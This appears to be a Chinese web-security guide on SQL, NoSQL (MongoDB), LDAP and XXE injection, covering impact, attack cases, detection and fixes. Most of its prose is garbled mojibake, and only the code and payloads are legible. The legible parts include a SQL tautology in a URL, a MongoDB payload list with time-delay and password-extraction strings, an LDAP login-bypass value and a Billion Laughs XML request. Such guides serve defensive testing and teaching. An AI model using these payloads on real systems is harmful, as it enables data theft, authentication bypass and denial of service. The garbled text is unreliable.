é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°Webè¡¨å•æäº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚å°†ï¼ˆæ¶æ„çš„ï¼‰SQLå‘½ä»¤æ³¨å…¥åˆ°åŽå°æ•°æ®åº“å¼•æ“Žæ‰§è¡Œçš„èƒ½åŠ›ï¼Œå®ƒå¯ä»¥é€šè¿‡åœ¨Webè¡¨å•ä¸­è¾“å…¥ï¼ˆæ¶æ„ï¼‰SQLè¯­å¥å¾—åˆ°ä¸€ä¸ªå­˜åœ¨å®‰å…¨æ¼æ´žçš„ç½‘ç«™ä¸Šçš„æ•°æ®åº“ï¼Œè€Œä¸æ˜¯æŒ‰ç…§è®¾è®¡è€…æ„å›¾åŽ»æ‰§è¡ŒSQLè¯­å¥ã€‚ å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„æ¼ã€ç ´åæ•°æ®åº“å†…å®¹å’Œç»“æž„ã€ç”šè‡³åˆ©ç”¨æ•°æ®åº“æœ¬èº«çš„æ‰©å±•åŠŸèƒ½æŽ§åˆ¶æœåŠ¡å™¨æ“ä½œç³»ç»Ÿã€‚ æ¼æ´žå±å®³ æ”»å‡»è€…åˆ©ç”¨SQLæ³¨å…¥æ¼æ´žï¼Œå¯ä»¥èŽ·å–æ•°æ®åº“ä¸­çš„å¤šç§ä¿¡æ¯(ä¾‹å¦‚ï¼šç®¡ç†å‘˜åŽå°å¯†ç )ï¼Œä»Žè€Œè„±å–æ•°æ®åº“ä¸­å†…å®¹(è„±åº“)ã€‚åœ¨ç‰¹åˆ«æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥ä¿®æ”¹æ•°æ®åº“å†…å®¹æˆ–è€…æ’å…¥å†…å®¹åˆ°æ•°æ®åº“ï¼Œå¦‚æžœæ•°æ®åº“æƒé™åˆ†é…å­˜åœ¨é—®é¢˜ï¼Œæˆ–è€…æ•°æ®åº“æœ¬èº«å­˜åœ¨ç¼ºé™·ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡SQLæ³¨å…¥æ¼æ´žç›´æŽ¥èŽ·å–Webshellæˆ–è€…æœåŠ¡å™¨ç³»ç»Ÿæƒé™ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šåº”ç”¨ç¨‹åºåœ¨ä¸‹é¢å­˜åœ¨è„†å¼±æ€§çš„SQLè¯­å¥çš„æž„é€ ä¸­ä½¿ç”¨ä¸å¯ä¿¡æ•°æ®ï¼š 1String query = &quot;SELECT * FROM accounts WHERE custID=&apos;&quot; + request.getParameter(&quot;id&quot;) + &quot;&apos;â€œ; åœºæ™¯2ï¼šåŒæ ·çš„ï¼Œæ¡†æž¶åº”ç”¨çš„ç›²ç›®ä¿¡ä»»ï¼Œä»ç„¶å¯èƒ½å¯¼è‡´æŸ¥è¯¢è¯­å¥çš„æ¼æ´žã€‚ï¼ˆä¾‹å¦‚ï¼šHibernateæŸ¥è¯¢è¯­è¨€ï¼ˆHQLï¼‰ï¼‰ï¼š1Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'"); â€‹ åœ¨è¿™ä¸¤ä¸ªæ¡ˆä¾‹ä¸­ï¼Œæ”»å‡»è€…åœ¨æµè§ˆå™¨ä¸­å°†â€œidâ€å‚æ•°çš„å€¼ä¿®æ”¹æˆï¼š â€™ â€‹ orâ€™1â€™=â€™1ã€‚ä¾‹å¦‚ï¼šhttp://example.com/app/accountView?id=&#39; or &#39;1&#39;=&#39;1è¿™æ ·æŸ¥è¯¢è¯­å¥çš„æ„ä¹‰å°±å˜æˆäº†ä»Žaccountsè¡¨ä¸­è¿”å›žæ‰€æœ‰çš„è®°å½•ã€‚æ›´å±é™©çš„æ”»å‡»å¯èƒ½ å¯¼è‡´æ•°æ®è¢«ç¯¡æ”¹ç”šè‡³æ˜¯å­˜å‚¨è¿‡ç¨‹è¢«è°ƒç”¨ã€‚ æ£€æµ‹æ–¹æ³• æäº¤å•å¼•å·å­—ç¬¦&#39;å¹¶æŸ¥æ‰¾é”™è¯¯æˆ–å…¶ä»–å¼‚å¸¸ã€‚ æäº¤ä¸€äº›ç‰¹å®šäºŽSQLçš„è¯­æ³•ï¼Œä»¥è¯„ä¼°å…¥å£ç‚¹çš„åŸºç¡€ï¼ˆåŽŸå§‹ï¼‰å€¼å’Œå…¶ä»–å€¼ï¼Œå¹¶åœ¨æ‰€å¾—åº”ç”¨ç¨‹åºå“åº”ä¸­å¯»æ‰¾ç³»ç»Ÿå·®å¼‚ã€‚ æäº¤å¸ƒå°”æ¡ä»¶ï¼Œä¾‹å¦‚OR 1=1å¹¶OR 1=2, andåœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­å¯»æ‰¾å·®å¼‚ã€‚ æäº¤æ—¨åœ¨åœ¨SQLæŸ¥è¯¢ä¸­æ‰§è¡Œæ—¶è§¦å‘æ—¶é—´å»¶è¿Ÿçš„æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶å¯»æ‰¾å“åº”æ—¶é—´çš„å·®å¼‚ã€‚ æäº¤æ—¨åœ¨åœ¨SQLæŸ¥è¯¢ä¸­æ‰§è¡Œæ—¶è§¦å‘å¸¦å¤–ç½‘ç»œäº¤äº’çš„OASTæœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶ç›‘è§†æ‰€æœ‰ç»“æžœäº¤äº’ã€‚ ä¿®å¤å»ºè®® ä»£ç å±‚æœ€ä½³é˜²å¾¡SQLæ³¨å…¥æ–¹æ¡ˆï¼šé‡‡ç”¨sqlè¯­å¥é¢„ç¼–è¯‘å’Œç»‘å®šå˜é‡ï¼Œæ˜¯é˜²å¾¡sqlæ³¨å…¥çš„æœ€ä½³æ–¹æ³•ã€‚ ï¼ˆ1ï¼‰æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥éƒ½ä½¿ç”¨æ•°æ®åº“æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢æŽ¥å£ï¼Œå‚æ•°åŒ–çš„è¯­å¥ä½¿ç”¨å‚æ•°è€Œä¸æ˜¯å°†ç”¨æˆ·è¾“å…¥å˜é‡åµŒå…¥åˆ°SQLè¯­å¥ä¸­ã€‚å½“å‰å‡ ä¹Žæ‰€æœ‰çš„æ•°æ®åº“ç³»ç»Ÿéƒ½æä¾›äº†å‚æ•°åŒ–SQLè¯­å¥æ‰§è¡ŒæŽ¥å£ï¼Œä½¿ç”¨æ­¤æŽ¥å£å¯ä»¥éžå¸¸æœ‰æ•ˆçš„é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ã€‚ ï¼ˆ2ï¼‰å¯¹è¿›å…¥æ•°æ®åº“çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆâ€™â€&lt;&gt;&amp;*;ç­‰ï¼‰è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œæˆ–ç¼–ç è½¬æ¢ã€‚ ï¼ˆ3ï¼‰ç¡®è®¤æ¯ç§æ•°æ®çš„ç±»åž‹ï¼Œæ¯”å¦‚æ•°å­—åž‹çš„æ•°æ®å°±å¿…é¡»æ˜¯æ•°å­—ï¼Œæ•°æ®åº“ä¸­çš„å­˜å‚¨å­—æ®µå¿…é¡»å¯¹åº”ä¸ºintåž‹ã€‚ ï¼ˆ4ï¼‰æ•°æ®é•¿åº¦åº”è¯¥ä¸¥æ ¼è§„å®šï¼Œèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢æ¯”è¾ƒé•¿çš„SQLæ³¨å…¥è¯­å¥æ— æ³•æ­£ç¡®æ‰§è¡Œã€‚ ï¼ˆ5ï¼‰ç½‘ç«™æ¯ä¸ªæ•°æ®å±‚çš„ç¼–ç ç»Ÿä¸€ï¼Œå»ºè®®å…¨éƒ¨ä½¿ç”¨UTF-8ç¼–ç ï¼Œä¸Šä¸‹å±‚ç¼–ç ä¸ä¸€è‡´æœ‰å¯èƒ½å¯¼è‡´ä¸€äº›è¿‡æ»¤æ¨¡åž‹è¢«ç»•è¿‡ã€‚ ï¼ˆ6ï¼‰ä¸¥æ ¼é™åˆ¶ç½‘ç«™ç”¨æˆ·çš„æ•°æ®åº“çš„æ“ä½œæƒé™ï¼Œç»™æ­¤ç”¨æˆ·æä¾›ä»…ä»…èƒ½å¤Ÿæ»¡è¶³å…¶å·¥ä½œçš„æƒé™ï¼Œä»Žè€Œæœ€å¤§é™åº¦çš„å‡å°‘æ³¨å…¥æ”»å‡»å¯¹æ•°æ®åº“çš„å±å®³ã€‚ ï¼ˆ7ï¼‰é¿å…ç½‘ç«™æ˜¾ç¤ºSQLé”™è¯¯ä¿¡æ¯ï¼Œæ¯”å¦‚ç±»åž‹é”™è¯¯ã€å­—æ®µä¸åŒ¹é…ç­‰ï¼Œé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨è¿™äº›é”™è¯¯ä¿¡æ¯è¿›è¡Œä¸€äº›åˆ¤æ–­ã€‚ NoSQLæ³¨å…¥æ¼æ´žæè¿° NoSQLæ•°æ®åº“è°ƒç”¨éƒ½å†™åœ¨åº”ç”¨ç¨‹åºçš„ç¼–ç¨‹è¯­è¨€ï¼Œä¸€ä¸ªè‡ªå®šä¹‰çš„APIè°ƒç”¨ï¼Œæˆ–æ ¼å¼åŒ–æŒ‰ç…§é€šå¸¸çš„ä¹ æƒ¯ï¼ˆå¦‚XMLï¼ŒJSONï¼ŒLINQï¼Œç­‰ï¼‰ã€‚é’ˆå¯¹è¿™äº›è§„èŒƒçš„æ¶æ„è¾“å…¥å¯èƒ½ä¸ä¼šè§¦å‘ä¸»è¦çš„åº”ç”¨ç¨‹åºè¿‡æ»¤æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œè¿‡æ»¤æŽ‰å¸¸è§çš„HTMLç‰¹æ®Šå­—ç¬¦ï¼ˆä¾‹å¦‚ï¼‰â€œ&lt; &gt; &amp; ;â€ä¸ä¼šé˜»æ­¢é’ˆå¯¹JSON APIçš„æ”»å‡»ï¼Œå…¶ä¸­ç‰¹æ®Šå­—ç¬¦åŒ…æ‹¬â€œ/ { } :â€ã€‚ ä¸Žä¼ ç»Ÿçš„SQLæ³¨å…¥ç›¸æ¯”ï¼ŒNoSQLæ³¨å…¥æ”»å‡»å¯èƒ½åœ¨åº”ç”¨ç¨‹åºçš„ä¸åŒåŒºåŸŸä¸­æ‰§è¡Œã€‚åœ¨æ•°æ®åº“å¼•æ“Žå†…æ‰§è¡ŒSQLæ³¨å…¥çš„åœ°æ–¹ï¼ŒNoSQLå˜ä½“å¯ä»¥åœ¨åº”ç”¨ç¨‹åºå±‚æˆ–æ•°æ®åº“å±‚å†…æ‰§è¡Œï¼Œå…·ä½“å–å†³äºŽæ‰€ä½¿ç”¨çš„NoSQL APIå’Œæ•°æ®æ¨¡åž‹ã€‚é€šå¸¸ï¼ŒNoSQLæ³¨å…¥æ”»å‡»å°†åœ¨æ”»å‡»å­—ç¬¦ä¸²è¢«è§£æžï¼Œè¯„ä¼°æˆ–è¿žæŽ¥åˆ°NoSQL APIè°ƒç”¨çš„åœ°æ–¹æ‰§è¡Œã€‚ æ¼æ´žå±å®³ NoSQLæ³¨å…¥æ”»å‡»å¯ä»¥åœ¨è¿‡ç¨‹è¯­è¨€ä¸­è€Œä¸æ˜¯åœ¨å£°æ˜Žæ€§SQLè¯­è¨€ä¸­æ‰§è¡Œï¼Œå› æ­¤å…¶æ½œåœ¨å½±å“è¦å¤§äºŽä¼ ç»ŸSQLæ³¨å…¥ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šå¦‚æžœæ”»å‡»è€…èƒ½å¤Ÿæ“çºµä¼ é€’ç»™$whereè¿ç®—ç¬¦çš„æ•°æ®ï¼Œåˆ™è¯¥æ”»å‡»è€…å¯ä»¥åŒ…å«ä»»æ„JavaScriptï¼Œä»¥å°†å…¶è¯„ä¼°ä¸ºMongoDBæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ã€‚å¦‚æžœç”¨æˆ·è¾“å…¥ä¸ç»è¿‡æ¸…ç†å°±ç›´æŽ¥ä¼ é€’åˆ°MongoDBæŸ¥è¯¢ä¸­ï¼Œåˆ™ä»¥ä¸‹ä»£ç ä¸­æš´éœ²äº†ä¸€ä¸ªç¤ºä¾‹æ¼æ´žã€‚ 1db.myCollection.find( &#123; active: true, $where: function() &#123; return obj.credits - obj.debits &lt; $userInput; &#125; &#125; );; â€‹ ä¸Žæµ‹è¯•å…¶ä»–ç±»åž‹çš„æ³¨å…¥ä¸€æ ·ï¼Œä¸éœ€è¦å®Œå…¨åˆ©ç”¨æ­¤æ¼æ´žæ¥è¯æ˜Žé—®é¢˜ã€‚é€šè¿‡æ³¨å…¥ä¸Žç›®æ ‡APIè¯­è¨€ç›¸å…³çš„ç‰¹æ®Šå­—ç¬¦å¹¶è§‚å¯Ÿç»“æžœï¼Œæµ‹è¯•äººå‘˜å¯ä»¥ç¡®å®šåº”ç”¨ç¨‹åºæ˜¯å¦æ­£ç¡®æ¸… é™¤äº†è¾“å…¥ã€‚ä¾‹å¦‚ï¼Œåœ¨MongoDBä¸­ï¼Œå¦‚æžœæœªç»è¿‡æ»¤ä¼ é€’åŒ…å«ä»¥ä¸‹ä»»ä½•ç‰¹æ®Šå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œåˆ™ä¼šè§¦å‘æ•°æ®åº“é”™è¯¯ã€‚1' " \ ; &#123; &#125; â€‹ ä½¿ç”¨æ™®é€šçš„SQLæ³¨å…¥ï¼Œç±»ä¼¼çš„æ¼æ´žå°†ä½¿æ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„SQLå‘½ä»¤-éšæ„å…¬å¼€æˆ–å¤„ç†æ•°æ®ã€‚ä½†æ˜¯ï¼Œç”±äºŽJavaScriptæ˜¯ä¸€ç§åŠŸèƒ½å…¨é¢çš„è¯­è¨€ï¼Œå› æ­¤ï¼Œè¿™ä¸ä»…ä½¿æ”» å‡»è€…å¯ä»¥æ“çºµæ•°æ®ï¼Œè¿˜å¯ä»¥è¿è¡Œä»»æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æ¼æ´žä¸ä»…ä¼šåœ¨æµ‹è¯•æ—¶å¼•èµ·é”™è¯¯ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦æ¥åˆ¶ä½œæœ‰æ•ˆçš„JavaScriptã€‚ æ£€æµ‹æ–¹æ³• MongoDB NoSQLæ³¨å…¥å¸¸è§æµ‹è¯•payloadsï¼š 12345678910111213141516171819true, $where: '1 == 1', $where: '1 == 1'$where: '1 == 1'', $where: '1 == 11, $where: '1 == 1'&#123; $ne: 1 &#125;', $or: [ &#123;&#125;, &#123; 'a':'a' &#125; ], $comment:'successful MongoDB injection'db.injection.insert(&#123;success:1&#125;);db.injection.insert(&#123;success:1&#125;);return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1|| 1==1' &amp;&amp; this.password.match(/.*/)//+%00' &amp;&amp; this.passwordzz.match(/.*/)//+%00'%20%26%26%20this.password.match(/.*/)//+%00'%20%26%26%20this.passwordzz.match(/.*/)//+%00&#123;$gt: ''&#125;[$ne]=1';sleep(5000);';it=new%20Date();do&#123;pt=new%20Date();&#125;while(pt-it&lt;5000); åœ¨MongoDBä¸­æµ‹è¯•NoSQLæ³¨å…¥æ¼æ´ž MongoDB APIéœ€è¦BSONï¼ˆäºŒè¿›åˆ¶JSONï¼‰è°ƒç”¨ï¼Œå¹¶åŒ…æ‹¬ä¸€ä¸ªå®‰å…¨çš„BSONæŸ¥è¯¢ç»„è£…å·¥å…·ã€‚ä½†æ˜¯ï¼Œæ ¹æ®MongoDBæ–‡æ¡£ï¼Œåœ¨å‡ ä¸ªæ›¿ä»£æŸ¥è¯¢å‚æ•°ä¸­å…è®¸æœªåºåˆ—åŒ–çš„JSONå’ŒJavaScriptè¡¨è¾¾å¼ã€‚å…è®¸ä»»æ„JavaScriptè¾“å…¥çš„æœ€å¸¸ç”¨çš„APIè°ƒç”¨æ˜¯$whereè¿ç®—ç¬¦ã€‚ ç”±äºŽ$whereåœ¨SQLä¸­ï¼ŒMongoDBè¿ç®—ç¬¦é€šå¸¸ç”¨ä½œç®€å•çš„è¿‡æ»¤æˆ–æ£€æŸ¥ã€‚ 1db.myCollection.find( &#123; $where: "this.credits == this.debits" &#125; ); ä¿®å¤å»ºè®® ä¸ºäº†é¿å…NoSQLæ³¨å…¥ï¼Œå¿…é¡»å§‹ç»ˆå°†ç”¨æˆ·è¾“å…¥è§†ä¸ºä¸å—ä¿¡ä»»ã€‚å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥éªŒè¯ç”¨æˆ·è¾“å…¥ï¼š ä½¿ç”¨è¾“å…¥è¿‡æ»¤åº“ï¼Œä¾‹å¦‚mongo-sanitizeæˆ–mongooseã€‚ å¦‚æžœæ‰¾ä¸åˆ°é€‚åˆå¼€å‘çŽ¯å¢ƒçš„åº“ï¼Œè¯·å°†ç”¨æˆ·è¾“å…¥è½¬æ¢ä¸ºæœŸæœ›çš„ç±»åž‹ã€‚ä¾‹å¦‚ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ åœ¨MongoDBçš„æƒ…å†µä¸‹ï¼Œåˆ‡å‹¿åœ¨ç”¨æˆ·è¾“å…¥ä¸­ä½¿ç”¨whereï¼ŒmapReduceæˆ–groupè¿ç®—ç¬¦ï¼Œå› ä¸ºè¿™äº›è¿ç®—ç¬¦ä½¿æ”»å‡»è€…èƒ½å¤Ÿæ³¨å…¥JavaScriptï¼Œå› æ­¤æ¯”å…¶ä»–è¿ç®—ç¬¦æ›´åŠ å±é™©ã€‚ ä¸ºäº†åŠ å¼ºå®‰å…¨æ€§ï¼Œå¯ä»¥å°†mongod.confçš„javascriptEnabledè®¾ç½®ä¸ºfalseã€‚ ä»¥æœ€ä½Žçš„æƒé™è¿è¡Œåº”ç”¨ç¨‹åºï¼Œä»¥ä¾¿å³ä½¿è¢«åˆ©ç”¨ï¼Œæ”»å‡»è€…ä¹Ÿæ— æ³•è®¿é—®å…¶ä»–èµ„æºã€‚ LDAPæ³¨å…¥æ¼æ´žæè¿° LDAPï¼ˆè½»åž‹ç›®å½•è®¿é—®åè®®ï¼‰æ³¨å…¥æ˜¯ä¸€ç§æ”»å‡»ï¼Œç”¨äºŽåˆ©ç”¨åŸºäºŽWebçš„åº”ç”¨ç¨‹åºæž„å»ºåŸºäºŽç”¨æˆ·è¾“å…¥çš„LDAPè¯­å¥ã€‚å½“åº”ç”¨ç¨‹åºæ— æ³•æ­£ç¡®æ¸…ç†ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æœ¬åœ°ä»£ç†ä¿®æ”¹LDAPè¯­å¥ã€‚è¿™å¯èƒ½å¯¼è‡´æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¾‹å¦‚å‘æœªç»æŽˆæƒçš„æŸ¥è¯¢æŽˆäºˆæƒé™ä»¥åŠLDAPæ ‘ä¸­çš„å†…å®¹ä¿®æ”¹ã€‚SQLæ³¨å…¥ä¸­å¯ç”¨çš„ç›¸åŒé«˜çº§åˆ©ç”¨æŠ€æœ¯å¯ä»¥ç±»ä¼¼åœ°åº”ç”¨äºŽLDAPæ³¨å…¥ä¸­ã€‚ æ¼æ´žå±å®³ æ”»å‡»è€…å¯ä»¥æ›´æ”¹LDAPæŸ¥è¯¢çš„è¾“å…¥ï¼Œè¯¥è¾“å…¥å…è®¸æ‰§è¡ŒæœªæŽˆæƒçš„ä»£ç æˆ–å‘½ä»¤ï¼Œå…è®¸è¯»å–æˆ–ä¿®æ”¹æ•æ„Ÿæ•°æ®æˆ–å¯¼è‡´å…¶ä»–æ„å¤–è¡Œä¸ºã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šä»¥ä¸‹ä»£ç ä½¿ç”¨ç”¨æˆ·è¾“å…¥åœ°å€æ•°æ®æž„é€ LDAPæŸ¥è¯¢ï¼šç”±äºŽä»£ç æ— æ³•ä¸­å’Œç”¨äºŽæž„é€ æŸ¥è¯¢çš„åœ°å€å­—ç¬¦ä¸²ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æä¾›åŒ…å«å…¶ä»–LDAPæŸ¥è¯¢çš„åœ°å€ã€‚1234Example Language: Java context = new InitialDirContext(env);String searchFilter = &quot;StreetAddress=&quot; + address;NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls); æ£€æµ‹æ–¹æ³• åœºæ™¯1ï¼šæœç´¢è¿‡æ»¤å™¨ â€‹ å‡è®¾æˆ‘ä»¬ä¸€ä¸ªWebåº”ç”¨çš„æœç´¢è¿‡æ»¤å™¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š1searchfilter="(cn="+user+")" â€‹ å¯ä»¥é€šè¿‡HTTPè¯·æ±‚å®žä¾‹åŒ–ï¼š1http://www.example.com/ldapsearch?user=John â€‹ å¦‚æžœå°†å€¼Johnæ›¿æ¢ä¸º*ï¼Œåˆ™é€šè¿‡å‘é€è¯·æ±‚ï¼š1http://www.example.com/ldapsearch?user=* â€‹ è¿‡æ»¤å™¨å¦‚ä¸‹æ‰€ç¤ºï¼š1searchfilter="(cn=*)" â€‹ åŒ¹é…å…·æœ‰â€œcnâ€å±žæ€§çš„æ¯ä¸ªå¯¹è±¡ç­‰äºŽä»»ä½•å†…å®¹ã€‚ â€‹ å¦‚æžœåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°LDAPæ³¨å…¥çš„æ”»å‡»ï¼Œå®ƒå°†æ˜¾ç¤ºéƒ¨åˆ†æˆ–å…¨éƒ¨ç”¨æˆ·å±žæ€§ï¼Œå…·ä½“å–å†³äºŽåº”ç”¨ç¨‹åºçš„æ‰§è¡Œæµç¨‹å’ŒLDAPè¿žæŽ¥çš„ç”¨æˆ·çš„æƒé™ã€‚ â€‹ æµ‹è¯•äººå‘˜å¯ä»¥ä½¿ç”¨è¯•é”™æ–¹æ³•ï¼Œé€šè¿‡åœ¨å‚æ•°æ’å…¥â€œ(|&amp;*â€å’Œå…¶ä»–å­—ç¬¦ï¼Œä»¥æ£€æŸ¥é”™è¯¯çš„åº”ç”¨ç¨‹åºã€‚ åœºæ™¯2ï¼šç™»å½• â€‹ å¦‚æžœWebåº”ç”¨ç¨‹åºåœ¨ç™»å½•è¿‡ç¨‹ä¸­ä½¿ç”¨LDAPæ¥æ£€æŸ¥ç”¨æˆ·å‡­æ®ï¼Œå¹¶ä¸”å®¹æ˜“å—åˆ°LDAPæ³¨å…¥çš„å½±å“ï¼Œåˆ™å¯ä»¥é€šè¿‡æ³¨å…¥å§‹ç»ˆä¸ºçœŸçš„LDAPæŸ¥è¯¢ï¼ˆä»¥ç±»ä¼¼äºŽSQLå’ŒXPATHæ³¨å…¥çš„æ–¹å¼ï¼‰æ¥ç»•è¿‡èº«ä»½éªŒè¯æ£€æŸ¥ã€‚ â€‹ å‡è®¾Webåº”ç”¨ç¨‹åºä½¿ç”¨è¿‡æ»¤å™¨æ¥åŒ¹é…LDAPç”¨æˆ·/å¯†ç å¯¹ã€‚1searchlogin= "(&amp;(uid="+user+")(userPassword=&#123;MD5&#125;"+base64(pack("H*",md5(pass)))+"))"; â€‹ é€šè¿‡ä½¿ç”¨ä»¥ä¸‹å€¼ï¼š12user=*)(uid=*))(|(uid=*pass=password â€‹ æœç´¢è¿‡æ»¤å™¨å°†å¯¼è‡´ï¼š1searchlogin="(&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=&#123;MD5&#125;X03MO1qnZdYdgyfeuILPmQ==))"; â€‹ è¿™æ˜¯æ­£ç¡®çš„ï¼Œè€Œä¸”æ°¸è¿œéƒ½æ˜¯æ­£ç¡®çš„ã€‚è¿™æ ·ï¼Œæµ‹è¯•äººå‘˜å°†ä»¥LDAPæ ‘ä¸­çš„ç¬¬ä¸€ä¸ªç”¨æˆ·èº«ä»½èŽ·å¾—ç™»å½•çŠ¶æ€ã€‚ ä¿®å¤å»ºè®® é˜²æ­¢LDAPæ³¨å…¥çš„æœ€ä½³æ–¹æ³•æ˜¯ä½¿ç”¨å¿…è¦çš„éªŒè¯æ–¹æ¡ˆï¼Œä»¥ç¡®ä¿è¿›å…¥æŸ¥è¯¢çš„æ•°æ®ä¸åŒ…å«ä»»ä½•æ”»å‡»ã€‚ä½†æ˜¯ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæœ‰å¿…è¦åœ¨ä¼ é€’ç»™LDAPæŸ¥è¯¢çš„è¾“å…¥ä¸­åŒ…å«ç‰¹æ®Šå­—ç¬¦ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç”¨è½¬ä¹‰å¯ä»¥é˜²æ­¢LDAPè§£é‡Šå™¨è®¤ä¸ºé‚£äº›ç‰¹æ®Šå­—ç¬¦å®žé™…ä¸Šæ˜¯LDAPæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ã€‚ åœ¨LDAPçš„ç›®å½•ç»“æž„çš„DNï¼ˆDistinguished Nameï¼‰ä¸­éœ€è¦ä½¿ç”¨â€œ\â€è½¬ä¹‰çš„ç‰¹æ®Šå­—ç¬¦ 123456789101112&amp;!|=&lt;&gt;,+-"'; éœ€è¦ä½¿ç”¨{\ASCII}è½¬ä¹‰çš„ç‰¹æ®Šå­—ç¬¦ 123456( &#123;\28&#125;) &#123;\29&#125;\ &#123;\5c&#125;* &#123;\2a&#125;/ &#123;\2f&#125;NUL &#123;\0&#125; XMLå¤–éƒ¨å®žä½“æ³¨å…¥ï¼ˆXXEï¼‰æ¼æ´žæè¿° XMLå¤–éƒ¨å®žä½“æ”»å‡»æ˜¯é’ˆå¯¹åº”ç”¨ç¨‹åºè§£æžXMLè¾“å…¥ç±»åž‹çš„æ”»å‡»ã€‚å½“å¼±é…ç½®çš„XMLè§£æžå™¨å¤„ç†åŒ…å«å¯¹å¤–éƒ¨å®žä½“çš„å¼•ç”¨çš„XMLè¾“å…¥æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤æ”»å‡»ã€‚ æ¼æ´žå±å®³ æ³„éœ²æœºå¯†æ•°æ®ã€‚ æ‹’ç»æœåŠ¡ã€‚ ä¼ªé€ æœåŠ¡å™¨ç«¯è¯·æ±‚ï¼ˆSSRFï¼‰ã€‚ å‚æ•°å®žä½“ï¼Œè¯»å–ä»»æ„æ–‡ä»¶ã€‚ é€šè¿‡Xinclude åŒ…å«å¤–éƒ¨èµ„æºã€‚ è¿›è¡Œå†…ç½‘ç«¯å£æ‰«ææŽ¢æµ‹ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šBillion Laughs æ”»å‡»ï¼Œæ­¤æ”»å‡»ä¼šä½¿XMLè§£æžå™¨çš„å†…å­˜è¿‡è½½ï¼Œä»Žè€Œé€ æˆç›®æ ‡æ‹’ç»æœåŠ¡ï¼š è¯·æ±‚åŒ… 123456789101112POST http://example.com/xml HTTP/1.1&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt; &lt;!ENTITY bar "World "&gt; &lt;!ENTITY t1 "&amp;bar;&amp;bar;"&gt; &lt;!ENTITY t2 "&amp;t1;&amp;t1;&amp;t1;&amp;t1;"&gt; &lt;!ENTITY t3 "&amp;t2;&amp;t2;&amp;t2;&amp;t2;&amp;t2;"&gt;]&gt;&lt;foo&gt; Hello &amp;t3;&lt;/foo&gt; å“åº”åŒ… 123HTTP/1.0 200 OK Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World æ£€æµ‹æ–¹æ³• æºä»£ç å®¡è®¡ï¼š å¦‚æžœä»¥ä¸‹Java APIé…ç½®ä¸æ­£ç¡®ï¼Œåˆ™ç›®æ ‡ç³»ç»Ÿå¯èƒ½å®¹æ˜“å—åˆ°XXEçš„æ”»å‡»ã€‚ 12345678910111213141516171819javax.xml.parsers.DocumentBuilderjavax.xml.parsers.DocumentBuildFactoryorg.xml.sax.EntityResolverorg.dom4j.*javax.xml.parsers.SAXParserjavax.xml.parsers.SAXParserFactoryTransformerFactorySAXReaderDocumentHelperSAXBuilderSAXParserFactoryXMLReaderFactoryXMLInputFactorySchemaFactoryDocumentBuilderFactoryImplSAXTransformerFactoryDocumentBuilderFactoryImplXMLReaderXerces: DOMParser, DOMParserImpl, SAXParser, XMLParser æ£€æŸ¥æºä»£ç æ˜¯å¦å°†docTypeï¼Œå¤–éƒ¨DTDå’Œå¤–éƒ¨å‚æ•°å®žä½“è®¾ç½®ä¸ºç¦æ­¢ä½¿ç”¨ã€‚ Cè¯­è¨€xmlè§£æžåº“æºä»£ç æ£€æŸ¥å…³é”®å­—ï¼š 12libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile,xmlReadIO,xmlReadMemory,xmlCtxtReadDoc,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIOlibxerces-c: XercesDOMParser,SAXParser,SAX2XMLReader 